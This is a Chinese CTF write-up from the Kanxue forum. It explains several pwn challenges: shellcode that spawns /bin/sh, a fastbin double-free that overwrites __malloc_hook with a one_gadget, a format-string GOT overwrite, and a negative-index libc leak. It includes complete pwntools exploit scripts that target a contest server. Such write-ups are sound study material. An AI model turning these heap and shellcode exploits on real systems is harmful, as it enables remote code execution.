
```python
from pwn import *
##from LibcSearcher import *
from pwnlib.util.iters import mbruteforce
from hashlib import sha256
import base64
context.log_level = 'debug'
##context.terminal = ["tmux", "splitw", "-h"]
context.arch = 'amd64'
context.os = 'linux'
r = process('./code')
def add(con):
    r.recvuntil(':')
    r.send(con)
pd = '''
add rdx , 0x10;
add eax , 0x3b;
push rdx;
'''
add(asm(pd))
pd = '''
add rdx , 0x10;
xor rsi , rsi;
push rdx;
'''
add(asm(pd))
pd = '''
add rdx , 0x10;
mov rdi , rdx;
push rdx;
'''
add(asm(pd))
pd = '''
add rdi , 0x10;
xor rdx , rdx;
push rdi;
'''
add(asm(pd))
pd = '''
add rdi , 0x10;
syscall;
'''
##gdb.attach(r)
add(asm(pd))
gdb.attach(r)
add('/bin/sh\x00')
r.interactive()
```

## （四）ezheap

### 前言

纪念俺的第一道堆题

如果对 `fastbin_attack` 大致如何实现不太熟悉的可以康康俺的堆的随笔，本篇主要是通过对复现招新赛俺没出的堆题来记录一下 `fastbin_attack` 的一些细节

### 前置知识

#### (1) `malloc` 返回地址（内存指针）到底是个啥：

这个在俺的随笔里也有，但是俺今天复现的时候才发现俺只明白了字面意思

`double_free` 有个修改 `fd` 指针到 `fake_chunk` 的地址，然后通过 `malloc` 要把这个地址拿出来的，但这两个地址其实是不一样的，`malloc` 返回的是 `fake_chunk` 的 `content` 段的地址，意思是会有两个机器字长的偏差

#### (2) `glibc` 的检测机制:

这个 `fake_chunk` 可不能随便构造，因为 `glibc` 有个检查 `size` 成员的机制，虽然俺现在不知道它是怎么检查的，有没有对齐的要求，但是俺知道至少不为 0

### 保护

![img](https://bbs.kanxue.com/upload/attach/202204/943085_DNKATK5Q8S99776.jpg)

除了 `pie` 全开了

### 反汇编

![img](https://bbs.kanxue.com/upload/attach/202204/943085_SHCRFTRAU3HSCH7.jpg)

![img](https://bbs.kanxue.com/upload/attach/202204/943085_GUDSGGPAC7WZEMT.jpg)

![img](https://bbs.kanxue.com/upload/attach/202204/943085_P9HAR3U3SM6YNFG.jpg)

![img](https://bbs.kanxue.com/upload/attach/202204/943085_942XQ99MVSY8HRE.jpg)

很标准的管理系统，增删和打印

### 思路

通过 `double_free` 到地址为（`0x40403d`）的 `fake_chunk`，通过修改 `content` 段 (`0x40404d`) 一直覆盖到 * （`&unk_404060 + v1 + 2`）（`0x404070`）的位置为 `free` 的 `got` 表从而泄露 `libc` 基址

然后再次 `double_free`，`fake_chunk` 为 `malloc_hook` - `0x23` (用地址错位构造 `size` 为 `0x7f`)，通过 `add` 函数修改其 `content` 来写修改 `malloc_hook` 为 `one_gadget`

最后调用一次 `malloc`（`0`）直接 `pwn` 掉

### exp

```python
from pwn import *
context.log_level = 'debug'
##r=process('./heap')
r = remote("116.62.46.174",30000)
libc = ELF('./libc-2.23')
def cho(num):
    r.recvuntil("Your choice:")
    r.sendline(str(num))
def add(id,si,con):
    cho(1)
    r.recvuntil("Idx:")
    r.sendline(str(id))
    r.recvuntil("Size:")
    r.sendline(str(si))
    r.recvuntil("Content?\n")
    r.send(con)
def delet(id):
    cho(2)
    r.recvuntil("Idx:")
    r.sendline(str(id))
def show(id):
    cho(3)
    r.recvuntil("Idx:")
    r.sendline(str(id))
add(0,0x68,'a')
##gdb.attach(r)
add(1,0x68,'b')
##gdb.attach(r)
delet(0)
delet(1)
##gdb.attach(r)
delet(0)
add(0,0x68,p64(0x40403d))
add(1,0x68,'a')
add(0,0x68,'b')
##gdb.attach(r)
add(0,0x68,'a'*0x23 + p64(0x403fa8))
##gdb.attach(r)
show(0)
libcbase = u64(r.recv(6).ljust(8,'\x00')) - libc.sym['free']
log.success("libcbase:" + hex(libcbase))
hook = libcbase + libc.sym['__malloc_hook']
add(0,0x68,'a')
add(1,0x68,'b')
delet(0)
delet(1)
delet(0)
add(0,0x68,p64(hook - 0x23))
add(1,0x68,'a')
add(0,0x68,'b')
one = [0x45226,0x4527a,0xf03a4,0xf1247]
onegadget = one[3] + libcbase
add(0,0x68,'a'*0x13 + p64(onegadget))
cho(1)
r.recvuntil("Idx:")
r.sendline(str(0))
r.recvuntil("Size:")
##gdb.attach(r)
r.sendline(str(0))
r.interactive()
```

## （五）overflow

### 例题：【赛博协会招新赛】overflow

### 保护

![img](https://bbs.kanxue.com/upload/attach/202204/943085_67HAYKW82GDTSSA.jpg)

### ida

![img](https://bbs.kanxue.com/upload/attach/202204/943085_EBSJBAVDNWZNSZQ.jpg)

### frame

![img](https://bbs.kanxue.com/upload/attach/202204/943085_XHRRNHTRJRYS7HC.jpg)

### 思路

首先要调用 `shell` 函数的话是要 `leak` `libc` 基址的，发现可用 `printf`（`buf`）来 `leak` 返回地址的 `__libc_start_main` + `231` 即可算出 `libc` 基地址

用 `scanf` 字符串格式化漏洞修改 `elf.got`['`exit`'] 为 `main` 函数的 `got` 从而返回，然后再次修改 `elf.got`['`exit`'] 为 `one_gadget` 即可

## （六）secret

### 保护

和上上上上道的保护一样就不展示了（懒得）

![img](https://bbs.kanxue.com/upload/attach/202204/943085_R6HQEU88VZ344XS.jpg)

### ida

![img](https://bbs.kanxue.com/upload/attach/202204/943085_3PDURAE7XUTZEH2.jpg)

发现没啥思路（当时还没想到 `printf` 函数怎么用）

![img](https://bbs.kanxue.com/upload/attach/202204/943085_U7BWAAVJY3ZX6AU.jpg)

（大师傅说这个的时候栈和 `bss` 段以及 `.got.plt` 段都看烂了）

先看看栈

![img](https://bbs.kanxue.com/upload/attach/202204/943085_VUMFCE9556NX76E.jpg)

哟，这不是 `wiki` 上的那道原题吗（当时学 `onegadget` 并没有完全懂）？

套个模板，选择爆破 然后就在纠结到底爆破 `dl_fini` 还是 `libc_start`

`wiki` 是爆破的 `dl_fini`，那就先试试

结果不行

那就 `libc_start`?

还是不行。。。。。 怎么办？

回去看反汇编，灵光一闪！

我输入一个负数它不就能泄露低地址的 `got` 表了莫

我真 `tm` 是个小天才

结果，还是，输出了我不能控制的数据

于是，意识到需要从汇编代码的角度去看为什么

![img](https://bbs.kanxue.com/upload/attach/202204/943085_FGH3KPAFMMJCB29.jpg)

发现 `esi` 在 `0x401243` 被修改为 `eax`

`eax` 在上条被修改为数组首地址偏移 `rdx` 位地址的内容（`rax` 不用管是个定值调调就知道）

然后 `rdx` 被修改为 `rax` * `4`，当时 `rax` 就是我们输入的内容 所以直接输入偏移量是不对的，得除以 `4` 由于 `printf`（“`%d`”）只能输出 `4` 个字节的内容，所以我们减去 `elf.got` [] 获得不是完全的 `libc` 基址, 而是低几 位的（具体几位得调调才知道），这时候要用到 `libc_main_start` 和 `libc` 首地址非常近的性质，直接覆盖 `libc_mian_start` 的低几位就可调用 `one_gadget`

### exp

```python
from pwn import *
context.log_level = 'debug'
r = remote('116.62.46.174',20001)
##r=process('./secret')
libc = ELF('./libc-2.27.so')
r.recvuntil('I have 10 secrets, choice one to read?')
##gdb.attach(r)
r.sendline('-34')
r.recvuntil('The secret is ')
string = r.recvuntil('\n')[:-1]
print(string)
address = int(string)
##print(string)
##print(hex(string))
##address=int(string)
base = address - libc.symbols['puts']
##print(hex(address))
##print(hex(libc.symbols['puts']))
one_gadget = base + 0x4f432
print(hex(one_gadget))
r.recvuntil("leave your secret")
##print(one)
payload = 0x38*'a' + p32(one_gadget)[:5]
r.send(payload)
r.interactive()
```

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)

[#题解集锦](https://bbs.kanxue.com/forum-171-1-187.htm)
